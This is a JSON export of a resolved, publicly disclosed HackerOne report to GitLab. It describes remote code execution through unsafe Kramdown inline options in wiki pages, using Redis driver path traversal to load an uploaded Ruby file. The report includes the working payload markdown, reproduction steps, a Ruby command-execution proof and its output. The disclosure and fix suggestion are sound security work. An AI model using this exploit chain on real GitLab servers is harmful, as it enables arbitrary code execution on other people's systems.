{
  "id": 1125425,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI1NDI1",
  "url": "https://hackerone.com/reports/1125425",
  "title": "RCE via unsafe inline Kramdown options when rendering certain Wiki pages",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-03-14T13:38:23.577Z",
  "submitted_at": "2021-03-14T13:38:23.678Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140713Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db879978f9fd492ff4f0cf088d0d518d005a10ac4bd218d9a0b4fb72b8548662"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-20T17:35:23.805Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-16T19:27:49.027Z",
  "team_member_agreed_on_going_public_at": "2021-04-20T17:35:23.645Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nWhen rendering wiki content with certain extensions such as `.rmd`,  `render_wiki_content` will call [`other_markup_unsafe`](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.9.3-ee/app/helpers/markup_helper.rb#L145) which will end up calling `GitHub::Markup.render` from the `github-markup` gem.  Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.\n\nSince `kramdown` is loaded, this will end up using it for the [markdown parser](https://github.com/github/markup/blob/v1.7.0/lib/github/markup/markdown.rb#L23) by calling `Kramdown::Document.new(content).to_html`\n\nKramdown has a special extension that allows for options to be [set inline](https://kramdown.gettalong.org/options.html), the example they give is: `{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter_opts=\"{line_numbers: true\\}\" /}`\n\nThe default syntax highlighter is `rouge` which has an option [`formatter`](https://kramdown.gettalong.org/syntax_highlighter/rouge.html) that can be set via `syntax_highlighter_opts` in the inline options. This option gets used by [`formatter_class`](https://github.com/gettalong/kramdown/blob/REL_2_3_0/lib/kramdown/converter/syntax_highlighter/rouge.rb#L73):\n\n```ruby\n  def self.call(converter, text, lang, type, call_opts)\n      opts = options(converter, type)\n      call_opts[:default_lang] = opts[:default_lang]\n      return nil unless lang || opts[:default_lang] || opts[:guess_lang]\n\n      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)\n      return nil if opts[:disable] || !lexer || (lexer.tag == \"plaintext\" && !opts[:guess_lang])\n\n      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0\n      formatter = formatter_class(opts).new(opts)\n      formatter.format(lexer.lex(text))\n    end\n\n  def self.formatter_class(opts = {})\n      puts \"formatter\"\n      puts opts[:formatter]\n      case formatter = opts[:formatter]\n      when Class\n        formatter\n      when /\\A[[:upper:]][[:alnum:]_]*\\z/\n        ::Rouge::Formatters.const_get(formatter)\n      else\n        # Available in Rouge 2.0 or later\n        ::Rouge::Formatters::HTMLLegacy\n      end\n    rescue NameError\n      # Fallback to Rouge 1.x\n      ::Rouge::Formatters::HTML\n    end\n```\n\nSo this a means that `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` will be called, where `opts` is controllable via the inline options to kramdown, allowing ruby objects to be initialised  so long as the validation of `/\\A[[:upper:]][[:alnum:]_]*\\z/` passes. The validation slightly restricts things, but pretty much any class without a namespace (`::` is not allowed) can be created. For example (the two `~~` should have an extra `~` but it's messing up the h1 formatting so will need to add it):\n\n```markdown\n{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: CSV, line_numbers: true\\}\" /}\n\n~~ ruby\n    def what?\n      42\n    end\n~~\n```\n\nWill result in a `CSV` object being created and then it will error with `private method 'format' called for #<CSV:0x00007fe4df7e26d0>` as it tries to use this as the formatter.\n\nOne of the loaded classes is gitlab is `Redis` from [redis-rb](https://github.com/redis/redis-rb) which has an option `driver` that is used to load the driver class:\n\nhttps://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507\n```ruby\n    def _parse_driver(driver)\n      driver = driver.to_s if driver.is_a?(Symbol)\n\n      if driver.kind_of?(String)\n        begin\n          require_relative \"connection/#{driver}\"\n        rescue LoadError, NameError => e\n          begin\n            require \"connection/#{driver}\"\n          rescue LoadError, NameError => e\n            raise RuntimeError, \"Cannot load driver #{driver.inspect}: #{e.message}\"\n          end\n        end\n\n        driver = Connection.const_get(driver.capitalize)\n      end\n\n      driver\n    end\n```\n\nAs both `require_relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.\n\nOne of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: `[file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb)`. The default `gitlab_rails['uploads_directory']` is `/var/opt/gitlab/gitlab-rails/uploads` meaning the final file location will be `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb`.\n\nCombining all of of this, we can create the following `.rmd` file to execute our payload (add `~` to both of the `~~`):\n```\n{::options auto_ids=\"false\" footnote_nr=\"5\" syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\\}\" /}\n\n~~ ruby\ndef what?\n  42\nend\n~~\n```\n\n### Steps to reproduce\n\n1. Create a new snippet with any title and file\n1. In the description, click `Attach a file` and select the final ruby payload such as:\n    ```ruby\nputs \"hello from ruby\"\n`echo vakzz was here > /tmp/vakzz`\n    ```\n1. Make note of the upload path: `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`\n1. Create a new project\n1. Click Wiki and create a default home page\n1. Hit `Clone repository` to get the clone command\n1. Clone the repo `git clone git@gitlab-docker.local:root/proj1.wiki.git` and add the following file `page1.rmd` using the path from above (add `~` to both the the `~~`): \n\n    ```\n{::options syntax_highlighter=\"rouge\" syntax_highlighter_opts=\"{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\\}\" /}\n~~ ruby\ndef what?\n  42\nend\n~~\n    ```\n\n1. Push the changes `git add -A . && git commit -m \"page1.rmd\" && git push`\n1. Refresh the wiki, there should now be `page1 ` of the right hand side\n1. Click and load `page1`\n1. In the gitlab logs you should see something like:\n\n    ```\nwrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\nlib/gitlab/other_markup.rb:11:in `render'\napp/helpers/markup_helper.rb:280:in `other_markup_unsafe'\napp/helpers/markup_helper.rb:145:in `markup_unsafe'\napp/helpers/markup_helper.rb:130:in `render_wiki_content'\napp/views/shared/wikis/show.html.haml:30\n    ```\n\n1. Looking at `/tmp` you can see that the payload was executed:\n\n    ```bash\nroot@gitlab-docker:~# cat /tmp/vakzz\nvakzz was here\n    ```\n\n### Impact\nAllows any user with push access to a wiki to execute arbitrary ruby code.\n\n### Examples\nExample page using the inline options to change the highlighter from rouge to `minted` - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1\n\n### What is the current *bug* behavior?\nInline options can be set when rendering kramdown documents\n\n### What is the expected *correct* behavior?\n`forbidden_inline_options` could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.7.2p137\nGem Version:\t3.1.4\nBundler Version:2.1.4\nRake Version:\t13.0.3\nRedis Version:\t6.0.10\nGit Version:\t2.29.0\nSidekiq Version:5.2.9\nGo Version:\tunknown\n\nGitLab information\nVersion:\t13.9.1-ee\nRevision:\t8ae438629fa\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t12.5\nURL:\t\thttp://gitlab-docker.local\nHTTP Clone URL:\thttp://gitlab-docker.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-docker.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t13.16.1\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAllows any user with push access to a wiki to execute arbitrary ruby code.",
  "bounty_amount": "20000.0",
  "formatted_bounty": "$20,000",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 412,
  "voters": [
    "honoki",
    "falcoxyz",
    "joaxcar",
    "osman1337",
    "mr-medi",
    "cxzer0",
    "jackalpret",
    "svalkanov",
    "matheus_garbelini",
    "sn97",
    "and 402 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
